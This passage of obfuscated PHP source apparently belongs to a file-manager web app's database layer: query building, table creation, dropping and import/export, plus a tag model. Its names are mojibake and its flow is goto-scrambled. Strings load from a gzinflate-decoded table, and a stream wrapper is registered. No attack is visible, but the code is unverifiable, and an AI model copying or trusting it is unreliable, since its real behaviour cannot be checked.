$cãËó‡Ç[$aÉ“¤¶ä¶[337]] : $aÉ“¤¶ä¶[33]); return $this->execute($cÇ„†­ø´Õ, $this->parseBind(!empty($cãËó‡Ç[$aÉ“¤¶ä¶[269]]) ? $cãËó‡Ç[$aÉ“¤¶ä¶[269]] : array())); } public function delete($bº• ÈÂ§ = array()) { $bÒÈˆ»£ =& $_SERVER[Õİõş]; $this->model = $bº• ÈÂ§[$bÒÈˆ»£[265]]; $a‰¦—ªÇ ¤ = $bÒÈˆ»£[959] . $this->parseTable($bº• ÈÂ§[$bÒÈˆ»£[263]]) . $this->parseWhere(!empty($bº• ÈÂ§[$bÒÈˆ»£[259]]) ? $bº• ÈÂ§[$bÒÈˆ»£[259]] : $bÒÈˆ»£[33]) . $this->parseOrder(!empty($bº• ÈÂ§[$bÒÈˆ»£[346]]) ? $bº• ÈÂ§[$bÒÈˆ»£[346]] : $bÒÈˆ»£[33]) . $this->parseLimit(!empty($bº• ÈÂ§[$bÒÈˆ»£[276]]) ? $bº• ÈÂ§[$bÒÈˆ»£[276]] : $bÒÈˆ»£[33]) . $this->parseLock(isset($bº• ÈÂ§[$bÒÈˆ»£[780]]) ? $bº• ÈÂ§[$bÒÈˆ»£[780]] : !1) . $this->parseComment(!empty($bº• ÈÂ§[$bÒÈˆ»£[337]]) ? $bº• ÈÂ§[$bÒÈˆ»£[337]] : $bÒÈˆ»£[33]); return $this->execute($a‰¦—ªÇ ¤, $this->parseBind(!empty($bº• ÈÂ§[$bÒÈˆ»£[269]]) ? $bº• ÈÂ§[$bÒÈˆ»£[269]] : array())); } public function select($F§ ÃÄ§Ú = array()) { goto fÒó‰õÓˆø; d–Š¡‹Õ­˜: $bøÜÎ¨½½¼ = isset($F§ ÃÄ§Ú[$d¤§’‡”À¤[333]]) ? $F§ ÃÄ§Ú[$d¤§’‡”À¤[333]] : !1; if ($bøÜÎ¨½½¼) { $cäùòí½º = is_string($bøÜÎ¨½½¼[$d¤§’‡”À¤[89]]) ? $bøÜÎ¨½½¼[$d¤§’‡”À¤[89]] : $d¤§’‡”À¤[960] . md5($cß´ª„ë–); $díÊ¬Æ¸´° = think_cache($cäùòí½º, $d¤§’‡”À¤[33], $bøÜÎ¨½½¼); if (!1 !== $díÊ¬Æ¸´°) { return $díÊ¬Æ¸´°; } } $f¸ÇÄáßˆ² = $this->query($cß´ª„ë–, $this->parseBind(!empty($F§ ÃÄ§Ú[$d¤§’‡”À¤[269]]) ? $F§ ÃÄ§Ú[$d¤§’‡”À¤[269]] : array())); goto FÙ…µ§Öø; fÒó‰õÓˆø: $d¤§’‡”À¤ =& $_SERVER[Õİõş]; $this->model = $F§ ÃÄ§Ú[$d¤§’‡”À¤[265]]; $cß´ª„ë– = $this->buildSelectSql($F§ ÃÄ§Ú); goto d–Š¡‹Õ­˜; FÙ…µ§Öø: if ($bøÜÎ¨½½¼ && !1 !== $f¸ÇÄáßˆ²) { think_cache($cäùòí½º, $f¸ÇÄáßˆ², $bøÜÎ¨½½¼); } return $f¸ÇÄáßˆ²; goto C÷ÖÀğÒºÒ; C÷ÖÀğÒºÒ: } public function buildSelectSql($eÚâØàĞ = array()) { goto F¥°½ÒÉ£–; F¥°½ÒÉ£–: $dë§”‹¿¶Í =& $_SERVER[Õİõş]; if (isset($eÚâØàĞ[$dë§”‹¿¶Í[336]])) { if (strpos($eÚâØàĞ[$dë§”‹¿¶Í[336]], $dë§”‹¿¶Í[47])) { list($aæ™‘‚ã§, $B‘•ò¥î„Ğ) = explode($dë§”‹¿¶Í[47], $eÚâØàĞ[$dë§”‹¿¶Í[336]]); } else { $aæ™‘‚ã§ = $eÚâØàĞ[$dë§”‹¿¶Í[336]]; } $aæ™‘‚ã§ = $aæ™‘‚ã§ ? $aæ™‘‚ã§ : 1; $B‘•ò¥î„Ğ = isset($B‘•ò¥î„Ğ) ? $B‘•ò¥î„Ğ : (is_numeric($eÚâØàĞ[$dë§”‹¿¶Í[276]]) ? $eÚâØàĞ[$dë§”‹¿¶Í[276]] : 20); $f®´×…ƒœ¾ = $B‘•ò¥î„Ğ * ((int) $aæ™‘‚ã§ - 1); $eÚâØàĞ[$dë§”‹¿¶Í[276]] = $f®´×…ƒœ¾ . $dë§”‹¿¶Í[47] . $B‘•ò¥î„Ğ; } if (think_config($dë§”‹¿¶Í[961])) { $cŠ¾æ§¹Ô = $dë§”‹¿¶Í[962] . md5(serialize($eÚâØàĞ)); $c÷ÖÅ· = think_cache($cŠ¾æ§¹Ô); if ($c÷ÖÅ·) { return $c÷ÖÅ·; } } goto bÃé“Í ¾; e¬ïğÑ¤åó: return $b˜²µ¬‚Á; goto F†ßƒ¶‚áì; bÃé“Í ¾: $b˜²µ¬‚Á = $this->parseSql($this->selectSql, $eÚâØàĞ); $b˜²µ¬‚Á .= $this->parseLock(isset($eÚâØàĞ[$dë§”‹¿¶Í[780]]) ? $eÚâØàĞ[$dë§”‹¿¶Í[780]] : !1); if (isset($cŠ¾æ§¹Ô)) { think_cache($cŠ¾æ§¹Ô, $b˜²µ¬‚Á); } goto e¬ïğÑ¤åó; F†ßƒ¶‚áì: } public function parseSql($C ¦§•¹Å, $e·†äÓ³è¿ = array()) { $bªÛÙè˜Š‰ =& $_SERVER[Õİõş]; $C ¦§•¹Å = str_replace(array($bªÛÙè˜Š‰[963], $bªÛÙè˜Š‰[964], $bªÛÙè˜Š‰[965], $bªÛÙè˜Š‰[966], $bªÛÙè˜Š‰[967], $bªÛÙè˜Š‰[968], $bªÛÙè˜Š‰[969], $bªÛÙè˜Š‰[970], $bªÛÙè˜Š‰[971], $bªÛÙè˜Š‰[972], $bªÛÙè˜Š‰[973]), array($this->parseTable("{$e·†äÓ³è¿[$bªÛÙè˜Š‰[263]]}"), $this->parseDistinct(isset($e·†äÓ³è¿[$bªÛÙè˜Š‰[974]]) ? $e·†äÓ³è¿[$bªÛÙè˜Š‰[974]] : !1), $this->parseField(!empty($e·†äÓ³è¿[$bªÛÙè˜Š‰[257]]) ? $e·†äÓ³è¿[$bªÛÙè˜Š‰[257]] : $bªÛÙè˜Š‰[172]), $this->parseJoin(!empty($e·†äÓ³è¿[$bªÛÙè˜Š‰[266]]) ? $e·†äÓ³è¿[$bªÛÙè˜Š‰[266]] : $bªÛÙè˜Š‰[33]), $this->parseWhere(!empty($e·†äÓ³è¿[$bªÛÙè˜Š‰[259]]) ? $e·†äÓ³è¿[$bªÛÙè˜Š‰[259]] : $bªÛÙè˜Š‰[33]), $this->parseGroup(!empty($e·†äÓ³è¿[$bªÛÙè˜Š‰[975]]) ? $e·†äÓ³è¿[$bªÛÙè˜Š‰[975]] : $bªÛÙè˜Š‰[33]), $this->parseHaving(!empty($e·†äÓ³è¿[$bªÛÙè˜Š‰[976]]) ? $e·†äÓ³è¿[$bªÛÙè˜Š‰[976]] : $bªÛÙè˜Š‰[33]), $this->parseOrder(!empty($e·†äÓ³è¿[$bªÛÙè˜Š‰[346]]) ? $e·†äÓ³è¿[$bªÛÙè˜Š‰[346]] : $bªÛÙè˜Š‰[33]), $this->parseLimit(!empty($e·†äÓ³è¿[$bªÛÙè˜Š‰[276]]) ? $e·†äÓ³è¿[$bªÛÙè˜Š‰[276]] : $bªÛÙè˜Š‰[33]), $this->parseUnion(!empty($e·†äÓ³è¿[$bªÛÙè˜Š‰[331]]) ? $e·†äÓ³è¿[$bªÛÙè˜Š‰[331]] : $bªÛÙè˜Š‰[33]), $this->parseComment(!empty($e·†äÓ³è¿[$bªÛÙè˜Š‰[337]]) ? $e·†äÓ³è¿[$bªÛÙè˜Š‰[337]] : $bªÛÙè˜Š‰[33])), $C ¦§•¹Å); return $C ¦§•¹Å; } public function getLastSql($CÛ“Ä“…ùÇ = '') { return $CÛ“Ä“…ùÇ ? $this->modelSql[$CÛ“Ä“…ùÇ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($cÍ¨ˆÄ¨•‚) { return addslashes($cÍ¨ˆÄ¨•‚); } public function setModel($c¼ƒØ¼ƒ¼ƒ) { $this->model = $c¼ƒØ¼ƒ¼ƒ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($E¤À»˜ôğß, $aæôÕîêÕã = '') { $this->database = $E¤À»˜ôğß; $this->type = $aæôÕîêÕã; } public function model($CÍíªæÛÄ› = '') { return new ModelBase($CÍíªæÛÄ›, $_SERVER[Õİõş][33], $this->database); } public function db($fæ’‹¤ÏŸá = false) { goto DíÑ…ˆ¸ñ³; e§ò­Ğİ—Ú: if (!$BÖ¸°ç·ê™) { $Fî„Í°™¥ù->execute("\143\162\145\x61\x74\145\40\144\x61\164\x61\142\141\x73\145\40\140{$D’¦ùÌ½²}\x60"); } $C“ §ŞäÓõ[$bÂ·Ğ­«¶[230]] = $D’¦ùÌ½²; if ($C“ §ŞäÓõ[$bÂ·Ğ­«¶[892]] == $bÂ·Ğ­«¶[726]) { $C“ §ŞäÓõ[$bÂ·Ğ­«¶[891]] .= $bÂ·Ğ­«¶[977] . $D’¦ùÌ½²; } goto EåÖ¢ä¯ç; EåÖ¢ä¯ç: $this->database = $C“ §ŞäÓõ; $Fî„Í°™¥ù->execute("\x75\x73\145\x20\x60{$D’¦ùÌ½²}\140"); return $Fî„Í°™¥ù; goto bÊÃÈœˆ°‘; dí³×¤ä¯ô: $this->database = $C“ §ŞäÓõ; $Fî„Í°™¥ù = $this->model()->db(); $BÖ¸°ç·ê™ = $Fî„Í°™¥ù->execute("\163\150\x6f\x77\40\x64\141\x74\141\142\141\x73\x65\163\x20\154\x69\153\x65\x20\47{$D’¦ùÌ½²}\47"); goto e§ò­Ğİ—Ú; DíÑ…ˆ¸ñ³: $bÂ·Ğ­«¶ =& $_SERVER[Õİõş]; $C“ §ŞäÓõ = $this->database; if ($this->type == $bÂ·Ğ­«¶[9] || !$fæ’‹¤ÏŸá) { return $this->model()->db(); } goto CÛß‘·§°£; CÛß‘·§°£: $D’¦ùÌ½² = $C“ §ŞäÓõ[$bÂ·Ğ­«¶[230]]; $C“ §ŞäÓõ[$bÂ·Ğ­«¶[230]] = $bÂ·Ğ­«¶[33]; if ($C“ §ŞäÓõ[$bÂ·Ğ­«¶[892]] == $bÂ·Ğ­«¶[726]) { $bÜÅ·¬äÈó = $C“ §ŞäÓõ[$bÂ·Ğ­«¶[891]]; $C“ §ŞäÓõ[$bÂ·Ğ­«¶[891]] = substr($bÜÅ·¬äÈó, 0, strrpos($bÜÅ·¬äÈó, $bÂ·Ğ­«¶[977])); } goto dí³×¤ä¯ô; bÊÃÈœˆ°‘: } public function createTable($cÁ‰éõƒÊ, $b¯–”«‘‰Ã = null) { $c÷ ¢´Àš =& $_SERVER[Õİõş]; if (!IO::exist($cÁ‰éõƒÊ)) { show_json(LNG($c÷ ¢´Àš[978]), !1); } $E½ä´Í¥šä = sqlSplit(IO::getContent($cÁ‰éõƒÊ)); foreach ($E½ä´Í¥šä as $b™õö‹Œ®½) { if ($b¯–”«‘‰Ã) { $bĞ¡·¨Ÿ = stripos($b™õö‹Œ®½, $c÷ ¢´Àš[979]) === 0; if ($bĞ¡·¨Ÿ) { $b¯–”«‘‰Ã->task[$c÷ ¢´Àš[980]] += 1; } } $this->model()->db()->execute($b™õö‹Œ®½); if ($b¯–”«‘‰Ã && $bĞ¡·¨Ÿ) { $C—™Ë§Ó­ = $c÷ ¢´Àš[981]; preg_match($C—™Ë§Ó­, $b™õö‹Œ®½, $cÍÁ¹î›ì); $b¯–”«‘‰Ã->task[$c÷ ¢´Àš[982]] = trim($Fë¨šªÔèŒ[0], $c÷ ¢´Àš[828]); $b¯–”«‘‰Ã->update(1); } } $this->taskToCache($b¯–”«‘‰Ã); } public function insertTable($eğÆ¡Â¦·¯, $eåîŞ±Ä³é = null) { $DÙŞ£Œ½© =& $_SERVER[Õİõş]; foreach ($eğÆ¡Â¦·¯ as $eÓÃ©ë‹¦È) { $Eâ‰¬»Šµ = basename($eÓÃ©ë‹¦È); $Eâ‰¬»Šµ = substr($Eâ‰¬»Šµ, 0, strrpos($Eâ‰¬»Šµ, $DÙŞ£Œ½©[91])); if ($eåîŞ±Ä³é) { $eåîŞ±Ä³é->task[$DÙŞ£Œ½©[982]] = $Eâ‰¬»Šµ; } if (get_filesize($eÓÃ©ë‹¦È) == 0) { continue; } $E·ŠÜÊ„‹„ = $this->sqlToDb($eÓÃ©ë‹¦È, $eåîŞ±Ä³é); if (!$E·ŠÜÊ„‹„) { show_json(LNG($DÙŞ£Œ½©[983]) . "\x5b{$Eâ‰¬»Šµ}\x5d", !1); } } $this->taskToCache($eåîŞ±Ä³é); } public function sqlFromDb($BŒ„¡â÷ğ×, $f‚èÕíº¤³, $Fí¼¥ÛˆÔ’ = null, $a‡­ŒøÓÀÆ = null) { goto FÊ–©¹ãÁ; c¹‘¶¸Ö•Á: fclose($dóˆåáŠ°“); return $AĞŞÖ¬²æ; goto EÊá“†¯; AŠÔ²ĞçÓ‡: $Eêîõˆ´˜ = 1; $d©ÇºóÆÎ² = 500; $dóˆåáŠ°“ = fopen($f‚èÕíº¤³, $_SERVER[Õİõş][984]); goto D¯©ƒ¦Á¤½; FÊ–©¹ãÁ: if ($Fí¼¥ÛˆÔ’) { $Fí¼¥ÛˆÔ’->task[$_SERVER[Õİõş][982]] = $BŒ„¡â÷ğ×; } $F¯ƒ©î‘® = $this->model($BŒ„¡â÷ğ×); $AĞŞÖ¬²æ = 0; goto AŠÔ²ĞçÓ‡; D¯©ƒ¦Á¤½: $B½¼’Ïîêà = $F¯ƒ©î‘®->getPk(); $B…Ù’˜äŒÑ = $F¯ƒ©î‘®->getDbFields(); do { $DÓÖ‰Îä»Ÿ = $F¯ƒ©î‘®->field($B…Ù’˜äŒÑ)->order($B½¼’Ïîêà . $_SERVER[Õİõş][985])->selectPage($d©ÇºóÆÎ², $Eêîõˆ´˜); $fËØÜ’÷Ÿ = !empty($DÓÖ‰Îä»Ÿ[$_SERVER[Õİõş][350]]) ? $DÓÖ‰Îä»Ÿ[$_SERVER[Õİõş][350]] : array(); if (!($eº’õ¹öä = count($fËØÜ’÷Ÿ))) { break; } if ($Fí¼¥ÛˆÔ’) { $Fí¼¥ÛˆÔ’->task[$_SERVER[Õİõş][980]] += $eº’õ¹öä; } $a©ô ƒœğ = array(); foreach ($fËØÜ’÷Ÿ as $eİâ­§ª°ø) { if ($a‡­ŒøÓÀÆ) { $eİâ­§ª°ø[$_SERVER[Õİõş][75]] = "\x7b\x69\x6f\72{$a‡­ŒøÓÀÆ}\x7d" . substr($eİâ­§ª°ø[$_SERVER[Õİõş][75]], strlen("\x7b\151\157\x3a{$eİâ­§ª°ø[$_SERVER[Õİõş][745]]}\175")); $eİâ­§ª°ø[$_SERVER[Õİõş][745]] = $a‡­ŒøÓÀÆ; } $a©ô ƒœğ[] = $_SERVER[Õİõş][986] . $this->sqlEncode($eİâ­§ª°ø) . $_SERVER[Õİõş][987]; } $BÎ«’ç—Ô— = "\x49\116\123\x45\122\124\40\111\116\x54\x4f\40\140{$BŒ„¡â÷ğ×}\140\40\50\140" . implode($_SERVER[Õİõş][988], $B…Ù’˜äŒÑ) . $_SERVER[Õİõş][989]; fwrite($dóˆåáŠ°“, $BÎ«’ç—Ô— . implode($_SERVER[Õİõş][990], $a©ô ƒœğ) . $_SERVER[Õİõş][67] . PHP_EOL); $Eêîõˆ´˜++; $AĞŞÖ¬²æ += $eº’õ¹öä; if ($Fí¼¥ÛˆÔ’) { $Fí¼¥ÛˆÔ’->update($eº’õ¹öä); } } while ($eº’õ¹öä == $d©ÇºóÆÎ²); goto c¹‘¶¸Ö•Á; EÊá“†¯: } public function sqlToDb($B¾ÉÁ®í²Ê, $C°ÊÒÜ‰  = null) { goto CŞ É÷ã‚Â; DòŠíµ„„: $bğ„¾ÙáÕ = 500 + 1; while (!feof($e±ñÕèÉî)) { if ($C°ÊÒÜ‰  && $A‹Ëª ’» != 0) { $C°ÊÒÜ‰ ->task[$aæ´™Ûµµ[980]] += 1; } $A‹Ëª ’»++; $dÛ÷ù¡‹Óæ = trim(fgets($e±ñÕèÉî)); $eã÷­½ìñ .= $aæ´™Ûµµ[50] . $this->sqlDecode($dÛ÷ù¡‹Óæ, $this->type); if ($A‹Ëª ’» == $bğ„¾ÙáÕ) { $eã÷­½ìñ = rtrim(trim($eã÷­½ìñ), $aæ´™Ûµµ[67]); if (!$DíÛ·ÑÅğ’->execute($eã÷­½ìñ)) { return !1; } if ($C°ÊÒÜ‰ ) { $C°ÊÒÜ‰ ->update($A‹Ëª ’» - 1); } $eã÷­½ìñ = $aæ´™Ûµµ[33]; $A‹Ëª ’» = 0; } } fclose($e±ñÕèÉî); goto AÅ†…«ã¦®; CŞ É÷ã‚Â: $aæ´™Ûµµ =& $_SERVER[Õİõş]; $DíÛ·ÑÅğ’ = $this->model()->db(); $e±ñÕèÉî = @fopen($B¾ÉÁ®í²Ê, $aæ´™Ûµµ[991]); goto aÀÖÒˆø‚; AÅ†…«ã¦®: if ($eã÷­½ìñ) { $eã÷­½ìñ = rtrim(trim($eã÷­½ìñ), $aæ´™Ûµµ[67]); if (!$DíÛ·ÑÅğ’->execute($eã÷­½ìñ)) { return !1; } if ($C°ÊÒÜ‰ ) { $C°ÊÒÜ‰ ->update($A‹Ëª ’» - 1); } } return !0; goto b“•©È¼³½; aÀÖÒˆø‚: if (!$e±ñÕèÉî) { return !1; } $A‹Ëª ’» = 0; $eã÷­½ìñ = $aæ´™Ûµµ[33]; goto DòŠíµ„„; b“•©È¼³½: } public function dropTable($fÓ­ºŞÑà = null) { $fÈà™àˆøÆ = $this->model()->db(); $e¹î¼…‘¿Á = $fÓ­ºŞÑà ? array($fÓ­ºŞÑà) : $fÈà™àˆøÆ->getTables(); if (!$e¹î¼…‘¿Á) { return; } foreach ($e¹î¼…‘¿Á as $fÓ­ºŞÑà) { $fÈà™àˆøÆ->execute("\x64\162\157\160\x20\x74\141\x62\154\145\x20\x69\146\x20\145\170\151\163\x74\163\40\x60{$fÓ­ºŞÑà}\140"); } } private function taskToCache($Eàì±…©Ä = null) { $f‰ÛŸ‘êµ =& $_SERVER[Õİõş]; if (!$Eàì±…©Ä) { return; } $A­¡±âÔØ = array($f‰ÛŸ‘êµ[982] => $Eàì±…©Ä->task[$f‰ÛŸ‘êµ[982]], $f‰ÛŸ‘êµ[980] => $Eàì±…©Ä->task[$f‰ÛŸ‘êµ[980]], $f‰ÛŸ‘êµ[992] => $Eàì±…©Ä->task[$f‰ÛŸ‘êµ[992]]); if ($A­¡±âÔØ[$f‰ÛŸ‘êµ[980]] == $A­¡±âÔØ[$f‰ÛŸ‘êµ[992]]) { $A­¡±âÔØ[$f‰ÛŸ‘êµ[698]] = 1; } Cache::set($f‰ÛŸ‘êµ[993] . $Eàì±…©Ä->task[$f‰ÛŸ‘êµ[363]], $A­¡±âÔØ); $Eàì±…©Ä->end(); } private function sqlEncode($A ¤½ÏĞ¥) { $cñµ Á¸  =& $_SERVER[Õİõş]; $bŒÔ«µÎ = array(); foreach ($A ¤½ÏĞ¥ as $f‚‡Âã é) { if (is_array($f‚‡Âã é)) { $f‚‡Âã é = json_encode_force($f‚‡Âã é); } $f‚‡Âã é = addslashes($f‚‡Âã é); $f‚‡Âã é = str_replace(array($cñµ Á¸ [994], $cñµ Á¸ [213]), array($cñµ Á¸ [995], $cñµ Á¸ [996]), $f‚‡Âã é); $bŒÔ«µÎ[] = str_replace($cñµ Á¸ [55], $cñµ Á¸ [997], $f‚‡Âã é); } return $cñµ Á¸ [55] . implode($cñµ Á¸ [998], $bŒÔ«µÎ) . $cñµ Á¸ [55]; } private function sqlDecode($bæÓ–ùà„, $D÷É‰ïÀ‹ƒ) { $E¨š‰‡¥× =& $_SERVER[Õİõş]; $bæÓ–ùà„ = str_replace(array($E¨š‰‡¥×[995], $E¨š‰‡¥×[996]), array($E¨š‰‡¥×[994], $E¨š‰‡¥×[213]), $bæÓ–ùà„); if ($D÷É‰ïÀ‹ƒ == $E¨š‰‡¥×[9]) { $bæÓ–ùà„ = stripslashes($bæÓ–ùà„); } return $bæÓ–ùà„; } } goto D„ƒÔğˆŒ†; E¾ÅÊË§©é: $_SERVER[$_SERVER[†ı´][52]] = ("\x39\x34\x38\x39".base64_decode('NTI='))+0;$_9nIa="5y3xsggYnQpICSmJTXUybMjnDkebazS9xqNCfyvpetCA68NFD5HEwWvVJuUzkKWK3";; stream_wrapper_register($_SERVER[†ı´][53], $_SERVER[†ı´][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($B˜òë¸›, $E¡ÜÎÓ…¬) { $CœáÔ¦ì =& $_SERVER[Õİõş]; if (isset(self::$_methodList[$B˜òë¸›])) { return @call_user_func_array(self::$_methodList[$B˜òë¸›], $E¡ÜÎÓ…¬); } else { if (method_exists($this, $B˜òë¸›)) { return call_user_func_array(array($this, $B˜òë¸›), $E¡ÜÎÓ…¬); } else { think_exception(__CLASS__ . $CœáÔ¦ì[4] . $B˜òë¸› . $CœáÔ¦ì[5]); } } } public static function __callStatic($EÛÑ†Ş–¶°, $CÄÙÌ—óÌõ) { if (isset(self::$_methodListStatic[$EÛÑ†Ş–¶°])) { return call_user_func_array(self::$_methodListStatic[$EÛÑ†Ş–¶°], $CÄÙÌ—óÌõ); } else { if (method_exists(self, $EÛÑ†Ş–¶°)) { return call_user_func_array(array(self, $EÛÑ†Ş–¶°), $CÄÙÌ—óÌõ); } else { show_json("{$EÛÑ†Ş–¶°}\50\51\x20\x6e\x6f\x74\40\x65\x78\151\163\x74\73", !1); } } } public static function addMethod($BÈŠøïÅ²Î, $A¢Ü‡ªãÈÉ) { self::$_methodList[$BÈŠøïÅ²Î] = $A¢Ü‡ªãÈÉ; } public static function addMethodStatic($d›ªºÁÂ‘Ã, $b£¡¦Ö—­Ô) { self::$_methodListStatic[$d›ªºÁÂ‘Ã] = $b£¡¦Ö—­Ô; } } goto EÂšÅŸšÀ; F‹¹á²óÍŞ: define($_SERVER[Õİõş][0], $_SERVER[Õİõş][1]); $_SERVER[†ı´] = explode($_SERVER[Õİõş][2], gzinflate(substr($_SERVER[Õİõş][3], 10, -8))); function Model($bÆñ²ÆÜ„ï = '', $FŒ¬å¼»àÍ = '', $D—‘ÛôÄ£¡ = '') { goto Eš¶÷ÈºÓ; fçÂŠ‹ÀìÙ: $E²²ö¹ĞíÏ[$Fµ³‚§æÚ] = new ModelBase($bÆñ²ÆÜ„ï, $FŒ¬å¼»àÍ, $D—‘ÛôÄ£¡); return $E²²ö¹ĞíÏ[$Fµ³‚§æÚ]; goto DÀ”Ì“Ğ¯Ö; dÅÚ‰¡±ĞÙ: if (isset($E²²ö¹ĞíÏ[$Fµ³‚§æÚ])) { return $E²²ö¹ĞíÏ[$Fµ³‚§æÚ]; } if ($bÆñ²ÆÜ„ï) { $bÆñ²ÆÜ„ï = strtoupper($bÆñ²ÆÜ„ï[0]) . substr($bÆñ²ÆÜ„ï, 1); $B†ÁçÌ†¿Á = $bÆñ²ÆÜ„ï . $FÀ¥É ¨ƒ[1]; if (class_exists($B†ÁçÌ†¿Á)) { $E²²ö¹ĞíÏ[$Fµ³‚§æÚ] = new $B†ÁçÌ†¿Á(); return $E²²ö¹ĞíÏ[$Fµ³‚§æÚ]; } } if (!$D—‘ÛôÄ£¡) { $D—‘ÛôÄ£¡ = $GLOBALS[$FÀ¥É ¨ƒ[2]][$FÀ¥É ¨ƒ[3]]; } goto fçÂŠ‹ÀìÙ; Eš¶÷ÈºÓ: $FÀ¥É ¨ƒ =& $_SERVER[†ı´]; static $E²²ö¹ĞíÏ = array(); $Fµ³‚§æÚ = strtolower($FŒ¬å¼»àÍ . $FÀ¥É ¨ƒ[0] . $bÆñ²ÆÜ„ï); goto dÅÚ‰¡±ĞÙ; DÀ”Ì“Ğ¯Ö: } goto C–æš–„æÜ; f£ù«¿°§´: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($a‚¨Ã÷¡Š) { $FÕ±ÇŸèÚ³ =& $_SERVER[Õİõş]; return array($FÕ±ÇŸèÚ³[2454] => array(USER_ID, $FÕ±ÇŸèÚ³[2510])); } protected function listData() { $cÄ­ëãĞ¿³ =& $_SERVER[Õİõş]; $D™Ô®ø‘Î = array($cÄ­ëãĞ¿³[1408] => USER_ID, $cÄ­ëãĞ¿³[431] => array($cÄ­ëãĞ¿³[2511], 0)); $Cê»™ºÊğµ = $cÄ­ëãĞ¿³[2512]; $FÅ×í«ºæÀ = $cÄ­ëãĞ¿³[2513]; $A‹ƒƒŠšŠì = $this->field($Cê»™ºÊğµ)->where($D™Ô®ø‘Î)->order($FÅ×í«ºæÀ)->select(); return $A‹ƒƒŠšŠì ? $A‹ƒƒŠšŠì : array(); } protected function listByTag($FÍ†ãÅ·¿í) { } protected function addToTag($FšÒ£‘½Úá, $e°Ê‚ŒùšÊ) { $DÔœó©´¸é =& $_SERVER[Õİõş]; if (!Model($DÔœó©´¸é[2280])->listData($e°Ê‚ŒùšÊ) || !Model($DÔœó©´¸é[754])->pathInfo($FšÒ£‘½Úá)) { return !1; } $F¸Š¨íÁ‰™ = array($DÔœó©´¸é[1408] => USER_ID, $DÔœó©´¸é[431] => $e°Ê‚ŒùšÊ, $DÔœó©´¸é[383] => $FšÒ£‘½Úá, $DÔœó©´¸é[384] => $DÔœó©´¸é[378], $DÔœó©´¸é[382] => $DÔœó©´¸é[33], $DÔœó©´¸é[2084] => 0); if ($this->where($F¸Š¨íÁ‰™)->find()) { return !1; } return $this->add($F¸Š¨íÁ‰™); } protected function removeFromTag($e¤ç¨¹“Šñ, $CôÁ¯ªíí‹) { $C´ÅÔß°á =& $_SERVER[Õİõş]; if (!Model($C´ÅÔß°á[2280])->listData($CôÁ¯ªíí‹) || !Model($C´ÅÔß°á[754])->pathInfo($e¤ç¨¹“Šñ)) { return !1; } $e¥Ëµ»¾„ = array($C´ÅÔß°á[1408] => USER_ID, $C´ÅÔß°á[431] => $CôÁ¯ªíí‹, $C´ÅÔß°á[384] => $C´ÅÔß°á[378], $C´ÅÔß°á[383] => $e¤ç¨¹“Šñ); return $this->where($e¥Ëµ»¾„)->delete(); } protected function removeByTag($Bœì©„ÅĞÈ) { $cŞÒÆø’…ò =& $_SERVER[Õİõş]; if (!$Bœì©„ÅĞÈ) { return !1; } $aÈ”²¶›Ã‚ = array($cŞÒÆø’…ò[1408] => USER_ID, $cŞÒÆø’…ò[431] => $Bœì©„ÅĞÈ); return $this->where($aÈ”²¶›Ã‚)->delete(); } protected function removeBySource($dÍÏ“ø¤Ìà) { $c«”ñœºÁø =& $_SERVER[Õİõş]; $A¢Ô÷ÊŒÆ‹ = array($c«”ñœºÁø[1408] => USER_ID, $c«”ñœºÁø[383] => $dÍÏ“ø¤Ìà, $c«”ñœºÁø[431] => array($c«”ñœºÁø[932], 0)); return $this->where($A¢Ô÷ÊŒÆ‹)->delete(); } }